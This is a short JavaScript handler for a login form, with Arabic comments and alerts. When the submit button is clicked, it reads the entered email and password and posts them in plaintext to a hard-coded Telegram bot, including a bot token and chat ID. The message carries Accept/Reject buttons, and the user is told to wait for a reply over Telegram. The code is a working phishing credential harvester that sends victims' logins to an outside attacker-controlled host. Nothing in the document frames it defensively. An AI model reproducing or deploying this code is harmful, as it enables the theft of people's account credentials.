document.getElementById('submit-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();

    if (!email || !password) {
        alert("⚠️ يرجى إدخال البريد وكلمة المرور.");
        return;
    }

    // إرسال البيانات إلى بوت التليجرام
    fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '5443898294',
            text: `🔐 Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Accept', callback_data: 'accept' },
                        { text: '❌ Reject', callback_data: 'reject' }
                    ]
                ]
            }
        })
    })
    .then(() => {
        console.log('📤 تم إرسال البيانات إلى البوت.');
        alert("✅ تم إرسال بياناتك، يرجى انتظار الرد عبر التيليجرام.");
        // لا استعلام أو توجيه تلقائي هنا
    })
    .catch(error => {
        console.error("❌ فشل في إرسال البيانات إلى تيليجرام:", error);
        alert("❌ حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى.");
    });
});
